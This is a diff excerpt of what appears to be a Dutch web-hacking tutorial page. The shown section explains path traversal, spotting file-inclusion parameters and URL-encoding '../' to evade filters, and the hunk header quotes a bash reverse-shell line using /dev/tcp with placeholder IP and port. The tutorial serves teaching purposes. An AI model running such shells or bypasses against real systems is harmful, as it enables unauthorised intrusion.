@@ -679,7 +679,7 @@ bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
 <h2 id="path-traversal">Path traversal</h2>
 <p>Path Traversal wordt ook wel Directory Traversal genoemd. Eigenlijk is dit niets anders dan in een regulier Linux filesystem navigeren. Als je iets in een andere map wilt zoeken zul je hier naar toe moeten navigeren op een manier zoals je dat op de command line ook doet. Als je test.txt wilt weergeven die een map hoger in de directory structuur staat kan je “cat ../test.txt” gebruiken.</p>
 <p>Je kan op deze manier geen sources van PHP bestanden in zien. PHP bestanden worden door de PHP functies <a href="https://www.php.net/include">include</a> en <a href="https://www.php.net/require">require</a> ingeladen en geparsed. Hierdoor zal je hetzelfde zien als wat je ziet als je de pagina rechtstreeks bezoekt.</p>
-<p>In sommige gevallen gebruiken mensen een WAF of hebben ze zelf scripting geschreven die opgegeven path&#39;s op hun inhoud filteren. Lang niet alle implementaties die mensen verzinnen geven een goede filtering. </p>
+<p>In sommige gevallen gebruiken mensen een WAF of hebben ze zelf scripting geschreven die opgegeven path&#39;s op hun inhoud filteren. Lang niet alle implementaties die mensen verzinnen geven een goede filtering. Wil je een inclusion mogelijkheid vinden dan is het altijd handig om in de querystrings te kijken naar keys die namen hebben als file, dir of path. Vaak gaat het dan om alfanumerieke waarden, maar dit hoeft niet altijd zo te zijn! Meestal is het handigst om even in de page source in je browser te kijken.</p>
 <p>Om bepaalde filters te omzeilen kan je bijvoorbeeld je path url encoden of tweemaal url encoden. Dit geeft in die volgorde de volgende resultaten:</p>
 <pre><code>../
 %2e%2e%2f
